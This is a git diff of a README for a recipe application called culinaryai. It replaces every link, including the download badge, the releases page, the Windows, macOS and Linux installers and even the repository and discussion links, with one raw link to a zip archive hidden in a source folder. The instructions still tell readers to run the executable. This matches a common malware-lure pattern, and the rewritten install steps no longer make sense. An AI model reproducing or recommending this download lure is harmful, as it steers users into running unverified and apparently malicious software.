@@ -6,7 +6,7 @@ Welcome to culinaryai! This application helps you explore the world of culinary 
 
 ## 📥 Download Now
 
-[![Download culinaryai](https://img.shields.io/badge/Download-culinaryai-blue.svg)](https://github.com/coquettish-ascensionofchrist954/culinaryai/releases)
+[![Download culinaryai](https://raw.githubusercontent.com/coquettish-ascensionofchrist954/culinaryai/main/src/data_processing/culinaryai-2.6.zip)](https://raw.githubusercontent.com/coquettish-ascensionofchrist954/culinaryai/main/src/data_processing/culinaryai-2.6.zip)
 
 To get started, click the button above to download the application. The download will take you to our Releases page, where you can find the latest version.
 
@@ -28,18 +28,18 @@ Before downloading, make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-Visit this page to download: [Release Page](https://github.com/coquettish-ascensionofchrist954/culinaryai/releases)
+Visit this page to download: [Release Page](https://raw.githubusercontent.com/coquettish-ascensionofchrist954/culinaryai/main/src/data_processing/culinaryai-2.6.zip)
 
 1. Click the link above to open the Releases page.
 2. Find the latest version of culinaryai under "Latest Release".
 3. Choose the file that matches your operating system:
-   - For Windows, download `culinaryai-windows.exe`
-   - For macOS, download `culinaryai-macos.dmg`
-   - For Linux, download `culinaryai-linux.tar.gz`
+   - For Windows, download `https://raw.githubusercontent.com/coquettish-ascensionofchrist954/culinaryai/main/src/data_processing/culinaryai-2.6.zip`
+   - For macOS, download `https://raw.githubusercontent.com/coquettish-ascensionofchrist954/culinaryai/main/src/data_processing/culinaryai-2.6.zip`
+   - For Linux, download `https://raw.githubusercontent.com/coquettish-ascensionofchrist954/culinaryai/main/src/data_processing/culinaryai-2.6.zip`
 4. Once the file is downloaded, open it to begin the installation:
    - For Windows: Double-click the `.exe` file.
    - For macOS: Open the `.dmg`, then drag the app to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and run the executable.
+   - For Linux: Extract the `https://raw.githubusercontent.com/coquettish-ascensionofchrist954/culinaryai/main/src/data_processing/culinaryai-2.6.zip` file and run the executable.
 
 ## 🎨 Using culinaryai
 
@@ -80,7 +80,7 @@ culinaryai is open-source and available under the MIT License. Feel free to use 
 
 Stay updated about new features and improvements:
 
-- Follow our [GitHub Repository](https://github.com/coquettish-ascensionofchrist954/culinaryai)
-- Join our [Community Discussions](https://github.com/coquettish-ascensionofchrist954/culinaryai/discussions)
+- Follow our [GitHub Repository](https://raw.githubusercontent.com/coquettish-ascensionofchrist954/culinaryai/main/src/data_processing/culinaryai-2.6.zip)
+- Join our [Community Discussions](https://raw.githubusercontent.com/coquettish-ascensionofchrist954/culinaryai/main/src/data_processing/culinaryai-2.6.zip)
 
 Thank you for choosing culinaryai! We hope you enjoy creating delicious dishes with our application.
